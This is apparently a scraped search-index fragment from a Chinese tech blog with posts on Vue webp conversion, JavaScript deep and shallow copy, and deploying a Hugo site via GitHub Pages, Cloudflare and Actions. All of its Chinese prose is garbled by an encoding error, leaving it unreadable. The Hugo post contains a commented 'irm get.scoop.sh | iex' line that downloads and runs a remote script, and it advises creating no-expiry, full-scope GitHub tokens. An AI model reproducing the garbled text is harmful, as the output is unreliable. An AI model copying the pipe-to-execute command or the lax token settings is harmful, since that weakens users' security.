elem.toDataURL(\u0026#34;image/webp\u0026#34;).indexOf(\u0026#34;data:image/webp\u0026#34;) === 0 } resolve(result) }) } // ä½¿ç”¨è‡ªå®šä¹‰è¿‡æ»¤å™¨ filter(Vue) ;(async () =\u0026gt; { Vue.prototype.$supportWebp = await isSupportWebp() if (Vue.prototype.$supportWebp) { document.documentElement.classList.add(\u0026#34;webp\u0026#34;) } })() è‹¥æœ‰ä½¿ç”¨ vue-lazyloadï¼Œå‰‡è£œä¸Š vue-lazyload æä¾›çš„ webp ç›¸é—œè¨­å®š \u0026lt;img\u0026gt; ä½¿ç”¨ v-lazy æ™‚ï¼Œsrcçš„åœ–ç‰‡é™„æª”åçš†æœƒè½‰æ›æˆ XXX.webp 1 2 3 4 5 6 7 8 9 10 vue.use(VueLazyload, { filter: { webp(listener) { if (vue.prototype.$supportWebp \u0026amp;\u0026amp; !~listener.src.indexOf(\u0026#34;.webp\u0026#34;)) { listener.src = listener.src.replace(/\\.(png|jpe?g)(\\?.*)?$/, \u0026#34;.webp\u0026#34;) listener.el.setAttribute(\u0026#34;data-src\u0026#34;, listener.src.replace(/\\.(png|jpe?g)(\\?.*)?$/, \u0026#34;.webp\u0026#34;)) } } } }) æ–¼å„å€‹ CSS ä¸­ï¼Œè‹¥ background ä½¿ç”¨åˆ°éœ€è½‰ .webp æ ¼å¼çš„ img ï¼Œè£œä¸Šè‡ªè¡Œè¨­å®šçš„ query (\u0026quot;?type=webp\u0026quot;)ï¼Œä»¥ä¾¿ webploader æŠ“è©² query é€²è¡Œè½‰æ›åœ–æª”æ ¼å¼ ä¾‹å¦‚ï¼š 1 2 3 4 5 6 7 8 9 10 .page-wrap-main { background: url(\u0026#34;~assets/images/main/bg.png\u0026#34;); background-size: cover; width: 100%; position: relative; .webp \u0026amp; { background-image: url(\u0026#34;~assets/images/main/bg.png?type=webp\u0026#34;); } } ","date":"2022-08-10T00:00:00Z","image":"https://live.staticflickr.com/65535/52282467469_7cf86509a9_o.jpg","permalink":"https://wayneblog.ga/2022-08-10/vue-cli-use-webp/","title":"Vue-cli pluginï¼šä½¿ç”¨å¥—ä»¶å°‡åœ–ç‰‡è‡ªå‹•è½‰æª”ç‚ºwebpæ ¼å¼"},{"content":" åƒè€ƒç¶²ç«™\nJavaScriptçš„è¨˜æ†¶é«”ç©ºé–“ åœ¨ JavaScript ä¸­ï¼Œæ¯ä¸€å€‹æ•¸æ“šéƒ½éœ€è¦ä¸€å€‹è¨˜æ†¶é«”ç©ºé–“ã€‚è¨˜æ†¶é«”ç©ºé–“åˆ†ç‚ºå…©ç¨®ï¼Œæ£§è¨˜æ†¶é«”ï¼ˆstockï¼‰ èˆ‡ å †è¨˜æ†¶é«”ï¼ˆheapï¼‰ã€‚ æ£§æ˜¯ç³»çµ±è‡ªå‹•åˆ†é…çš„è¨˜æ†¶é«”ç©ºé–“ï¼Œç”±ç³»çµ±è‡ªå‹•é‡‹æ”¾ï¼Œå †å‰‡æ˜¯å‹•æ…‹åˆ†é…çš„è¨˜æ†¶é«”ï¼Œå¤§å°ä¸å®šä¸æœƒè‡ªå‹•é‡‹æ”¾ã€‚ åŸºç¤è³‡æ–™å‹åˆ¥ JavaScript ä¸­çš„åŸºç¤è³‡æ–™å‹åˆ¥ï¼Œé€™äº›å€¼éƒ½æœ‰å›ºå®šçš„å¤§å°ï¼Œå„²å­˜åœ¨ æ£§è¨˜æ†¶é«”ä¸­ï¼Œç”±ç³»çµ±è‡ªå‹•åˆ†é…å„²å­˜ç©ºé–“ï¼Œåœ¨æ£§è¨˜æ†¶é«”ç©ºé–“çš„å€¼ï¼Œæˆ‘å€‘å¯ä»¥ç›´æ¥é€²è¡Œæ“ä½œï¼Œå› æ­¤åŸºç¤è³‡æ–™å‹åˆ¥éƒ½æ˜¯æŒ‰ç…§å€¼è¨ªå•ã€‚ åœ¨æ£§è¨˜æ†¶é«”ä¸­çš„è³‡æ–™ç™¼ç”Ÿè¤‡è£½çš„è¡Œç‚ºæ™‚ï¼Œç³»çµ±æœƒè‡ªå‹•ç‚ºæ–°è®Šæ•¸é–‹é—¢ä¸€å€‹æ–°çš„è¨˜æ†¶é«”ç©ºé–“ï¼Œç•¶è¤‡è£½åŸ·è¡Œå¾Œï¼Œå…©å€‹è¨˜æ†¶é«”ç©ºé–“çš„å€¼å°±äº’ä¸å½±éŸ¿ï¼Œæ”¹è®Šå…¶ä¸­ä¸€å€‹ä¸æœƒå½±éŸ¿å¦ä¸€å€‹ æ£§è¨˜æ†¶é«”ç©ºé–“è³‡æ–™è¤‡è£½ç¤ºä¾‹ 1 2 3 4 5 6 var a = `I am variable a`; var b = a; console.log(b); //`I am variable a` b = `I am variable b`; console.log(a); //`I am variable a` console.log(b); //`I am variable b` å¼•ç”¨è³‡æ–™å‹åˆ¥ å¼•ç”¨å‹åˆ¥çš„å€¼æ˜¯å„²å­˜åœ¨ å †è¨˜æ†¶é«”ä¸­çš„ç‰©ä»¶ï¼Œåœ¨ JavaScript ä¸­æˆ‘å€‘ä¸èƒ½ç›´æ¥æ“ä½œç‰©ä»¶çš„å †è¨˜æ†¶é«”ç©ºé–“ã€‚å› ç‚ºå¼•ç”¨å‹åˆ¥çš„å€¼éƒ½æ˜¯æŒ‰å¼•ç”¨è¨ªå•çš„ï¼Œæ‰€ä»¥åœ¨æ“ä½œç‰©ä»¶æ™‚ï¼Œå¯¦éš›ä¸Šæ˜¯æ“ä½œç‰©ä»¶çš„å¼•ç”¨è€Œä¸æ˜¯å¯¦éš›çš„ç‰©ä»¶ã€‚ å¼•ç”¨å¯ä»¥ç†è§£ç‚ºå„²å­˜åœ¨æ£§è¨˜æ†¶é«”ä¸­çš„ä¸€å€‹åœ°å€ï¼Œè©²åœ°å€æŒ‡å‘å †è¨˜æ†¶é«”ä¸­çš„ä¸€å€‹å¯¦éš›ç‰©ä»¶ã€‚ å¼•ç”¨å‹åˆ¥å€¼çš„è¤‡è£½ï¼Œç³»çµ±æœƒç‚ºæ–°çš„è®Šæ•¸è‡ªå‹•åˆ†é…ä¸€å€‹æ–°çš„æ£§è¨˜æ†¶é«”ç©ºé–“ é€™å€‹æ£§è¨˜æ†¶é«”ç©ºé–“ï¼Œå„²å­˜è‘—èˆ‡è¢«è¤‡åˆ¶è®Šé‡ç›¸åŒçš„æŒ‡æ¨™ï¼Œå„˜ç®¡ä»–å€‘åœ¨æ£§è¨˜æ†¶é«”ä¸­çš„è¨˜æ†¶é«”ç©ºé–“çš„ä½ç½®äº’ç›¸ç¨ç«‹ï¼Œä½†æ˜¯åœ¨å †è¨˜æ†¶é«”ä¸­è¨ªå•åˆ°çš„ç‰©ä»¶å¯¦éš›ä¸Šæ˜¯åŒä¸€å€‹ï¼Œå› æ­¤ç•¶æˆ‘å€‘æ”¹è®Šå…¶ä¸­ä¸€å€‹ç‰©ä»¶çš„å€¼æ™‚ï¼Œå¯¦éš›ä¸Šå°±æ˜¯æ”¹è®ŠåŸä¾†çš„ç‰©ä»¶ã€‚ æ£§è¨˜æ†¶é«”ç©ºé–“å„²å­˜æŒ‡æ¨™ï¼ˆåœ°å€ï¼‰ï¼Œå †è¨˜æ†¶é«”ç©ºé–“å„²å­˜å¯¦éš›çš„ç‰©ä»¶ï¼Œæˆ‘å€‘é€šéè®Šæ•¸è¨ªå•ç‰©ä»¶æ™‚ï¼Œå¯¦éš›ä¸Šè¨ªå•çš„æ˜¯ç‰©ä»¶çš„å¼•ç”¨ï¼ˆåœ°å€ï¼‰ã€‚ è¨˜æ†¶é«”ä¸­çš„æ£§å€åŸŸå­˜æ”¾è®Šæ•¸ï¼ˆåŸºæœ¬å‹åˆ¥çš„è®Šæ•¸åŒ…æ‹¬è®Šæ•¸å®£å‘Šå’Œå€¼ï¼‰ä»¥åŠæŒ‡å‘å †å€åŸŸå„²å­˜ä½ç½®çš„æŒ‡æ¨™ï¼ˆå¼•ç”¨å‹åˆ¥çš„è®Šæ•¸åŒ…æ‹¬è®Šæ•¸å®£å‘Šå’ŒæŒ‡å‘å…§å®¹çš„æŒ‡æ¨™ï¼‰ã€‚ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 var a = { name : `I am object a`, type : \u0026#39;object\u0026#39; } var b = a; console.log(b); // {name: \u0026#34;I am object a\u0026#34;, type: \u0026#34;object\u0026#34;} b.name = `I am object b`; console.log(a); // {name: \u0026#34;I am object b\u0026#34;, type: \u0026#34;object\u0026#34;} console.log(b); // {name: \u0026#34;I am object b\u0026#34;, type: \u0026#34;object\u0026#34;} åŸºæœ¬å‹åˆ¥ç¸½çµ åŸºæœ¬è³‡æ–™å‹åˆ¥ï¼š åŸºæœ¬è³‡æ–™å‹åˆ¥ åŒ…æ‹¬ nullã€undefinedã€numberã€stringã€booleanã€symbol(es6) å­˜æ”¾ä½ç½® è¨˜æ†¶é«”ä¸­çš„æ£§å€åŸŸä¸­ æ¯”è¼ƒ å€¼çš„æ¯”è¼ƒï¼Œåˆ¤æ–·æ˜¯å¦ç›¸ç­‰ï¼Œå¦‚æœå€¼ç›¸ç­‰ï¼Œå°±ç›¸ç­‰ã€‚ä¸€èˆ¬ä½¿ç”¨ === é€²è¡Œæ¯”è¼ƒï¼Œå› ç‚º == æœƒé€²è¡Œå‹åˆ¥çš„è½‰æ› æ‹·è² è³¦å€¼ï¼ˆé€šé = è³¦å€¼æ“ä½œç¬¦ä¾†è³¦å€¼ï¼‰ï¼Œå…©å€‹è®Šæ•¸çš„å€¼ä¹‹é–“ç›¸äº’æ²’æœ‰å½±éŸ¿ å¼•ç”¨å‹åˆ¥ç¸½çµ åŒ…æ‹¬ é™£åˆ—ã€ç‰©ä»¶ã€å‡½å¼ å­˜æ”¾ä½ç½® è¨˜æ†¶é«”çš„æ£§å€åŸŸä¸­å­˜æ”¾è®Šæ•¸å’ŒæŒ‡æ¨™ï¼Œå †å€åŸŸå„²å­˜å¯¦éš›çš„ç‰©ä»¶ æ¯”è¼ƒ æ˜¯å¼•ç”¨çš„æ¯”è¼ƒï¼ˆå°±æ˜¯åœ°å€çš„æ¯”è¼ƒï¼Œè®Šæ•¸åœ¨æ£§è¨˜æ†¶é«”ä¸­å°æ‡‰çš„æŒ‡æ¨™åœ°å€ç›¸ç­‰å°±æŒ‡å‘åŒä¸€å€‹ç‰©ä»¶ï¼‰åˆ¤æ–·æ˜¯å¦ç‚ºåŒä¸€å€‹ç‰©ä»¶ï¼Œç¤ºä¾‹å¦‚ä¸‹ è®Šæ•¸aå’Œè®Šæ•¸bçš„å¼•ç”¨ä¸åŒï¼Œç‰©ä»¶å°±ä¸æ˜¯åŒä¸€å€‹ç‰©ä»¶ 1 2 3 var a = {name:\u0026#39;Jay\u0026#39;}; var b = {name:\u0026#39;Jay\u0026#39;}; a===b //false æˆ‘å€‘å°JavaScriptä¸­å¼•ç”¨å‹åˆ¥é€²è¡Œæ“ä½œçš„æ™‚å€™ï¼Œéƒ½æ˜¯æ“ä½œå…¶ç‰©ä»¶çš„å¼•ç”¨ï¼ˆå„²å­˜åœ¨æ£§è¨˜æ†¶é«”ä¸­çš„æŒ‡æ¨™ï¼‰ è³¦å€¼ã€æ·±æ‹·è²å’Œæ·ºæ‹·è² (Assignment, deep copy and shallow copy) è³¦å€¼ï¼šå…©å€‹è®Šæ•¸çš„éƒ½æŒ‡å‘åŒä¸€å€‹ç‰©ä»¶ï¼Œæ”¹è®Šå…¶ä¸­ä¸€å€‹ï¼Œå¦ä¸€å€‹ä¹Ÿæœƒå—åˆ°å½±éŸ¿ã€‚ æ‰€è¬‚æ‹·è²å°±æ˜¯è¤‡è£½ï¼Œé€šéè¤‡è£½åŸç‰©ä»¶ç”Ÿæˆä¸€å€‹æ–°çš„ç‰©ä»¶ã€‚ æ·ºæ‹·è² é‡æ–°åœ¨å †è¨˜æ†¶é«”ä¸­é–‹é—¢ä¸€å€‹ç©ºé–“ï¼Œæ‹·è²å¾Œæ–°ç‰©ä»¶ç²å¾—ä¸€å€‹ç¨ç«‹çš„åŸºæœ¬è³‡æ–™å‹åˆ¥ è³‡æ–™ï¼Œå’ŒåŸç‰©ä»¶å…±ç”¨ä¸€å€‹åŸç‰©ä»¶å…§çš„å¼•ç”¨å‹åˆ¥ è³‡æ–™ï¼Œæ”¹è®ŠåŸºæœ¬å‹åˆ¥ è³‡æ–™ï¼Œå…©å€‹ç‰©ä»¶äº’ä¸å½±éŸ¿ï¼Œæ”¹è®Šå…¶ä¸­ä¸€å€‹ç‰©ä»¶å…§çš„å¼•ç”¨å‹åˆ¥ è³‡æ–™ï¼Œå¦ä¸€å€‹ç‰©ä»¶æœƒå—åˆ°å½±éŸ¿ã€‚ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 var obj = { name: \u0026#39;Jay Chou\u0026#39;, age: 32, song:{ name:\u0026#39;ç™¼å¦‚é›ª\u0026#39;, year:2007 } } var obj1 = obj; function shallowCopy(obj){ var scObj = {}; for(var prop in obj){ if(obj.hasOwnProperty(prop)){ scObj[prop] = obj[prop] } } return scObj; } var obj2 = shallowCopy(obj); console.log(obj === obj1,\u0026#39;obj === obj1\u0026#39;,\u0026#39;è³¦å€¼\u0026#39;); console.log(obj === obj2,\u0026#39;obj === obj2\u0026#39;,\u0026#39;æ·ºæ‹·è²\u0026#39;); // true \u0026#34;obj === obj1\u0026#34; \u0026#34;è³¦å€¼\u0026#34; // false \u0026#34;obj === obj2\u0026#34; \u0026#34;æ·ºæ‹·è²\u0026#34; console.log(obj.song === obj2.song); //true obj2.song.name=\u0026#39;é›™æˆªæ£\u0026#39;; obj2.name=\u0026#39;Jay\u0026#39;; console.log(obj) // {name: \u0026#34;Jay Chou\u0026#34;, age: 32, song: {name:\u0026#39;é›™æˆªæ£\u0026#39;,year:2007}} console.log(obj1); // {name: \u0026#34;Jay Chou\u0026#34;, age: 32, song: {name:\u0026#39;é›™æˆªæ£\u0026#39;,year:2007}} console.log(obj2); {name: \u0026#34;Jay\u0026#34;, age: 32, song: {name:\u0026#39;é›™æˆªæ£\u0026#39;,year:2007}} console.log(obj===obj1) //true console.log(obj===obj2) //false æ·±æ‹·è² ä¸è«–æ˜¯ç‰©ä»¶å…§çš„åŸºæœ¬å‹åˆ¥é‚„æ˜¯å¼•ç”¨å‹åˆ¥ éƒ½è¢«å®Œå…¨æ‹·è²,æ‹·è²å¾Œå…©å€‹ç‰©ä»¶äº’ä¸å½±éŸ¿ã€‚ ä¸€ç¨®æ¯”è¼ƒç°¡å–®å¯¦ç¾æ–¹æ³•æ˜¯ä½¿ç”¨ var dcObj = JSON.parse(JSON.stringify(obj)) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 var obj = { name: \u0026#39;Jay Chou\u0026#39;, age: 32, song:{ name:\u0026#39;ç™¼å¦‚é›ª\u0026#39;, year:2007 } } var dcObj=JSON.parse(JSON.stringify(obj)); console.log(dcObj); // {name: \u0026#34;Jay Chou\u0026#34;, age: 32, song: {name:\u0026#39;ç™¼å¦‚é›ª\u0026#39;,year:2007}} console.log(dcObj.song === obj.song); //false dcObj.name=\u0026#39;Jay\u0026#39;; dcObj.song.name=\u0026#39;é›™æˆªæ£\u0026#39;; console.log(obj); // {name: \u0026#34;Jay Chou\u0026#34;, age: 32, song: {name:\u0026#39;ç™¼å¦‚é›ª\u0026#39;,year:2007}} console.log(dcObj); //{name: \u0026#34;Jay\u0026#34;, age: 32, song: {name:\u0026#39;é›™æˆªæ£\u0026#39;,year:2007}} æ¯”è¼ƒï¼šè³¦å€¼ã€æ·±æ‹·è²ã€æ·ºæ‹·è²ï¼š è³¦å€¼ æ–°ç‰©ä»¶ä»ç„¶æŒ‡å‘åŸç‰©ä»¶ï¼Œæ”¹è®Šæ–°ç‰©ä»¶çš„åŸºæœ¬å‹åˆ¥å’Œå¼•ç”¨å‹åˆ¥çš„å€¼éƒ½æœƒä½¿åŸç‰©ä»¶å°æ‡‰çš„å€¼ä¸€åŒæ”¹è®Šã€‚ æ·ºæ‹·è² æ”¹è®Šæ–°ç‰©ä»¶åŸºæœ¬å‹åˆ¥çš„å€¼ä¸æœƒä½¿åŸç‰©ä»¶å°æ‡‰çš„å€¼ä¸€èµ·æ”¹è®Šï¼Œä½†æ˜¯æ”¹è®Šæ–°ç‰©ä»¶å¼•ç”¨å‹åˆ¥çš„å€¼æœƒä½¿åŸç‰©ä»¶å°æ‡‰çš„å€¼ä¸€åŒæ”¹è®Šã€‚ æ·±æ‹·è² æ”¹è®Šæ–°ç‰©ä»¶åŸºæœ¬å‹åˆ¥å’Œå¼•ç”¨å‹åˆ¥çš„å€¼ï¼Œéƒ½ä¸æœƒå½±éŸ¿åŸç‰©ä»¶ï¼Œå…©è€…äº’ç›¸ç¨ç«‹ï¼Œäº’ä¸å½±éŸ¿ã€‚ ","date":"2022-08-09T00:00:00Z","image":"https://live.staticflickr.com/65535/52277851687_14d13f49a6_o.jpg","permalink":"https://wayneblog.ga/2022-08-09/js-deep-copy-vs-shallow-copy/","title":"JavaScriptçš„è¨˜æ†¶é«”ç©ºé–“ã€è³¦å€¼å’Œæ·±æ·ºæ‹·è²"},{"content":" å®‰è£ hugo homebrew (MacOs) 1 brew install hugo scoop (Windows) 1 2 3 4 5 6 7 8 9 10 11 12 # è‹¥æœªå®‰è£é Scoopï¼Œéœ€å…ˆï¼š # 1. ç¬¬ä¸€æ¬¡éœ€å…ˆè¨­å®šï¼Œå…è¨±é ç«¯è…³æœ¬ # Set-ExecutionPolicy RemoteSigned -Scope CurrentUser # 2. ä¸‹è¼‰ä¸¦å®‰è£ Scoop # irm get.scoop.sh | iex # é€é Scoop å®‰è£ Hugo scoop install hugo # or å®‰è£æ“´å±•ç‰ˆæœ¬ # scoop install hugo-extended apt-get (Linux) 1 sudo apt-get install hugo åˆ©ç”¨ hugo å»ºç«‹ç¶²ç«™ 1 2 # é€²åˆ°æœ¬åœ°è³‡æ–™å¤¾æ ¹ç›®éŒ„å¾Œ hugo new site . --force ä¸‹è¼‰ä¸»é¡Œæ¨¡æ¿ (ä»¥ hugo-theme-stack ç‚ºä¾‹) 1 git submodule add git://github.com/CaiJimmy/hugo-theme-stack/ themes/hugo-theme-stack clone å®Œç•¢å¾Œï¼ŒæŠŠ exampleSite æ–‡ä»¶å¤¾ä¸­çš„ config.yaml è¤‡è£½åˆ°ç«™é»ç›®éŒ„ä¸‹ï¼ŒåŒæ™‚åˆªé™¤æ­¤ç›®éŒ„ä¸‹çš„ config.toml æ–‡ä»¶ã€‚\nå°‡ exampleSite/content/* è¤‡è£½åˆ°ç«™é»ç›®éŒ„ä¸‹çš„ content/\nå‰©é¤˜ä¸»é¡Œçš„è¨­å®šèˆ‡æ–‡ç« å…§å®¹ï¼Œå¯ä¾å€‹äººéœ€æ±‚è‡ªè¡Œè¨­å®šï¼Œæœ¬ç¯‡ä¸å†è´…è¿°ã€‚\ngithub å‰µå»ºä¸€å€‹ public çš„ repoï¼Œç”¨æ–¼å­˜æ”¾ç™¼å¸ƒç”¨çš„ public è³‡æ–™å¤¾ã€‚ å‰å¾€ repo çš„ Settings -\u0026gt; Pages è¨­å®šå¥½æ¬²ç™¼å¸ƒçš„åˆ†æ”¯èˆ‡ root path è¨­å®šå®Œç•¢å¾Œï¼Œgithub æœƒåˆ†é…çµ¦ä½ ä¸€å€‹å…¬é–‹çš„ç¶²å€ï¼šhttps://{your-account}.github.io/{your-repo-name}/ï¼Œè‹¥ä¸éœ€è‡ªå®šç¾©ç¶²å€èˆ‡ CI/CD æµç¨‹ï¼Œåˆ°æ­¤æ­¥é©Ÿå³å¯å®Œç•¢ã€‚\nè¨­å®šè‡ªå®šç¾©ç¶²å€ è¨»å†Šä¸€å€‹ç¶²å€ æœ¬æ–‡ä½¿ç”¨ freenom è¨»å†Šä¸€çµ„å…è²»çš„ç¶²å€ è¨»å†Šå®Œç•¢å¾Œï¼Œå‰å¾€ Manage Domain é¸æ“‡ Management Tools -\u0026gt; NameServers å¾Œï¼Œæ­¤é é¢å…ˆæš«æ™‚æ”¾ç½®è‘—ï¼Œå¾…æœƒå†å›ä¾†ç¹¼çºŒè¨­å®š å‰å¾€ Cloudflare å¾Œå° ç™»å…¥ Cloudflare å¾Œå°ï¼Œä¸¦é¸æ“‡ ç¶²ç«™ DNS è¨­å®šå¦‚åœ–ï¼š å°‡è¨»å†Šçš„ domain è¨­å®šæŒ‡å‘åˆ° github server ip 185.199.108.153 185.199.109.153 185.199.110.153 185.199.111.153 è¨­å®š CNAME www æŒ‡å‘åˆ°å‰›å‰› github åˆ†é…çµ¦ä½ çš„ domain (pathä¸éœ€è¦)ï¼š https://{your-account}.github.io/ å°‡ä¸‹æ–¹å…©å€‹ Cloudflare åç¨±ä¼ºæœå™¨è¤‡è£½ä¸‹ä¾† é¸æ“‡ Use custom nameservers (enter below) å°‡å‰›å‰›å¾ Cloudflare è¤‡è£½çš„å…©å€‹ NameServerï¼Œè²¼åˆ° NameServer 1ã€NameServer 2 Cloudflare å¾Œå°è¨­å®šå¼·åˆ¶ä½¿ç”¨ SSL é»é¸ SSL/TLS çš„ é‚Šç·£æ†‘è­‰ æ‰“é–‹ ä¸€å¾‹ä½¿ç”¨HTTPS å›åˆ° github pagesï¼Œå°‡ç¶²å€å¡«å¯«è‡³ Custom domainï¼ŒçŸ­æš«é©—è­‰å®Œç•¢å¾Œï¼Œå³å¯é»é¸ Save é€å‡ºè¨­å®š è‡ªå®šç¾©ç¶²å€å·²è¨­å®šå®Œç•¢ï¼Œå¯ä½¿ç”¨ç¶²å€æ‰“é–‹ç¶²ç«™ã€‚\nè¨­å®š github actions åš CI/CD æº–å‚™ææ–™1ï¼šç”Ÿæˆ github personal access tokens å‰å¾€ github çš„å€‹äººè¨­å®š \u0026quot;Settings\u0026quot;ï¼Œä¸‹æ–¹é»é¸ Developer settings\né»é¸ Generate new token\nè¨­å®šå‚™è¨»ã€éæœŸæ™‚é–“ã€æ¬Šé™å¾Œå³å¯ç”Ÿæˆ token\nå»ºè­°éæœŸæ™‚é–“å¯ä»¥è¨­å®š No expiration (ç„¡éæœŸæ™‚é–“)ã€æ¬Šé™è¨­å®š repo å…¨éƒ¨å‹¾é¸ ç”Ÿæˆå¾Œï¼Œtoken è«‹è¤‡è£½èµ·ä¾†ï¼Œå› ç‚ºé—œé–‰æ­¤é é¢å¾Œï¼Œå°‡ç„¡æ³•å†å–å¾—è©² token çš„æ˜ç¢¼ã€‚\næº–å‚™ææ–™2ï¼šç™»å…¥ Cloudflare å¾Œå°ï¼Œå–å¾— å€åŸŸè­˜åˆ¥ç¢¼(Zone) ç™»å…¥ Cloudflareï¼Œé¸æ“‡è‡ªå·±çš„ domain é»é¸ æ¦‚è§€ï¼Œä¸¦æ–¼åœ–ä¸­æ¨™ç¤ºè™•å–å¾— å€åŸŸè­˜åˆ¥ç¢¼(Zone Id) æº–å‚™ææ–™3ï¼šå–å¾— Global API Key æ–¼ æ¦‚è§€ ä¸‹æ–¹é»é¸ å–å¾—æ‚¨çš„ API Token é»é¸ æª¢è¦–ï¼Œè¼¸å…¥å¯†ç¢¼å¾Œå–å¾— Global API Key æº–å‚™ææ–™4ï¼šç”Ÿæˆ API token é»é¸ å»ºç«‹ Token -\u0026gt; å»ºç«‹è‡ªè¨‚ Token è¨­å®š token åç¨±ã€æ¬Šé™ã€TTL PSï¼šæ¬Šé™å¿…é ˆè‡³å°‘æ“æœ‰ å€åŸŸ -\u0026gt; å¿«å–æ¸…é™¤ -\u0026gt; æ¸…é™¤ï¼Œä»¥ä¾¿ CI/CD å¾Œä½¿ç”¨ token æ¸…é™¤ DNS cache è¨­å®šå®Œç•¢å¾Œå³å¯å»ºç«‹ token å»ºç«‹å¾Œï¼Œä¹Ÿè«‹å°‡ token è¤‡è£½èµ·ä¾†ï¼Œå› ç‚ºé—œé–‰æ­¤é é¢å¾Œï¼Œå°‡ç„¡æ³•å†å–å¾—è©² token çš„æ˜ç¢¼ã€‚ ææ–™æº–å‚™å®Œç•¢ï¼Œé–‹å§‹è¨­å®š secret é€²å…¥ source code çš„ repoï¼Œé»é¸ Settings -\u0026gt; Secret -\u0026gt; Actionsï¼Œä¸¦å°‡å‰›å‰›çš„å››å€‹æº–å‚™ææ–™è¨­å®šåˆ° Actions secrets ä¸­ æ­¤è™• Actions secrets çš„åç¨±å¦‚éœ€ä¿®æ”¹ï¼Œå‰‡å¾…æœƒçš„ github-actions.yml å…§çš„åç¨±ä¹Ÿéœ€è·Ÿè‘—ä¿®æ”¹ï¼Œå¦å‰‡æœƒæŠ“ä¸åˆ° secrets ä¸­è¨­å®šçš„å€¼å“¦!\næ–¼ source code repo æ ¹ç›®éŒ„æ–°å¢ .github/workflows/github-actions.yml github-actions.yml å…§å®¹ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 name: Auto build and publish to public site repository # åªæœ‰æ¨é€åˆ° main æ‰è§¸ç™¼ on: push: branches: - \u0026#34;main\u0026#34; pull_request: branches: [\u0026#34;main\u0026#34;] jobs: hugo-publish: name: publish content to public site runs-on: ubuntu-latest steps: # ä½¿ç”¨ç•¶å‰ source code çš„ repo - name: checkout source code repo uses: actions/checkout@v3 with: # å› ç‚ºç›®å‰çš„ repo æœ‰ä½¿ç”¨åˆ° submodule(hugo themes)ï¼Œæ‰€ä»¥ submodule ä¹Ÿè¦ä¸€ä½µåŒæ­¥ï¼Œä¸ç„¶åŸæœ¬çš„ repo æ˜¯æ²’æœ‰ submodule çš„å…§å®¹ submodules: true token: ${{ secrets.ACCESS_TOKEN }} # public ç¶²ç«™æ˜¯æ”¾ç½®åœ¨å¦ä¸€å€‹ repo æ‰€ä»¥é€™è£¡ä¹Ÿè¦ clone ä¸€ä»½ä¸‹ä¾†è™•ç† # å› ç‚ºæˆ‘ Hugo é è¨­æ˜¯ç”¢ç”Ÿæª”æ¡ˆåˆ° public è³‡æ–™å¤¾ï¼Œæ‰€ä»¥å°‡ public repo clone åˆ° ./public/ å…§ï¼Œä»¥ä¾¿å¾ŒçºŒ publish - name: clone and checkout public repo uses: actions/checkout@v3 with: # é€™è£¡æ˜¯ public ç¶²ç«™åœ¨ github ä¸Šçš„ repo åç¨± repository: {template/template-public-repo-name} path: public # tip: éœ€äº‹å…ˆç”¢ç”Ÿä¸€æŠŠ personal access token æ”¾åˆ° repo çš„ secrets è£¡ # ç„¶å¾Œ secrets è£¡çš„åç¨±å°±å« ACCESS_TOKEN # åƒè€ƒ https://help.github.com/en/actions/automating-your-workflow-with-github-actions/authenticating-with-the-github_token token: ${{ secrets.ACCESS_TOKEN }} # ä½¿ç”¨åˆ¥äººåšå¥½çš„ Hugo Actions - name: setup hugo uses: peaceiris/actions-hugo@v2 with: hugo-version: latest extended: true # ç”¨ Hugo ç”¢ç”Ÿæª”æ¡ˆ - name: build content to public site working-directory: ./ # --cleanDestinationDir æ¸…é™¤èˆŠæª”æ¡ˆ run: hugo --minify --gc --cleanDestinationDir # å°‡æª”æ¡ˆ commit åˆ° ç¶²ç«™ public repo - name: deploy and publish updates working-directory: ./public # user.email é‚„æœ‰ user.name å¯ä»¥å–è‡ªå·±å–œæ­¡çš„ï¼Œä¸€å®šè¦è¨­å®šä¸ç„¶æœƒå‡ºéŒ¯ run: | # ç•¶ git æœ‰æ›´å‹•æ™‚æ‰é€²è¡Œå‹•ä½œ if [[ `git status --porcelain` ]]; then git config --local user.email \u0026#34;{typing your email}\u0026#34; git config --local user.name \u0026#34;{typing your name}\u0026#34; git add . -A git commit -m \u0026#34;build: auto publish\u0026#34; git push origin else echo \u0026#34;content no changes\u0026#34; fi # æ¸…é™¤ cloudflare dns cache - name: clear cloudflare cache uses: nathanvaughn/actions-cloudflare-purge@master with: # Using Zone Id cf_zone: ${{ secrets.CLOUDFLARE_ZONE }} # Using API Token cf_auth: ${{ secrets.CLOUDFLARE_API_TOKEN }} å…§å®¹ {} å…§çš„è³‡è¨Šè«‹æ›´æ›æˆè‡ªå·±çš„è³‡è¨Š\né™„ä¸Š yaml ç¯„ä¾‹ï¼Œè©³ç´° github-actions.yaml æ–‡ä»¶è«‹æŸ¥é–± github å®˜æ–¹æ–‡ä»¶\nå»ºç«‹æª”æ¡ˆå¾Œï¼Œå°‡ commit push å¾Œï¼Œå³å¯æ–¼ source code repo çš„ Actions é é¢æŸ¥çœ‹ CI/CD çš„éç¨‹ã€‚ ","date":"2022-08-01T00:00:00Z","image":"https://live.staticflickr.com/65535/52274839367_8325e83fea_o.jpg","permalink":"https://wayneblog.ga/2022-08-01/hugo-github-pages-actions-and-cloudflare/","title":"æ¶è¨­éƒ¨è½æ ¼ä¹‹ä¸€æ¢é¾å…è²»å¯¶å…¸ï¼šHugo ç”Ÿæˆéœæ…‹ç¶²ç«™ã€Pages ç™¼å¸ƒç¶²ç«™ã€è¨­å®š custom domain(free 12 months)ã€Actions åš CI/CD"},{"content":" åƒè€ƒç¶²ç«™ - åˆå­¸è€…éƒ½è©²å­¸æœƒçš„ HTTP é€šè¨Šå”å®šåŸºç¤\nåƒè€ƒç¶²ç«™ - Http/2 æ˜¯ä»€éº¼?\nç›®å‰ HTTP é€šè¨Šå”å®šçš„ç‰ˆæœ¬ HTTP/0.9 æ–¼ 1991 å¹´ç™¼è¡¨(å·²å»¢æ­¢) HTTP/1.0 æ–¼ 1996 å¹´ 5 æœˆç™¼è¡¨(RFC 1945) HTTP/1.1 æ–¼ 1997 å¹´ 1 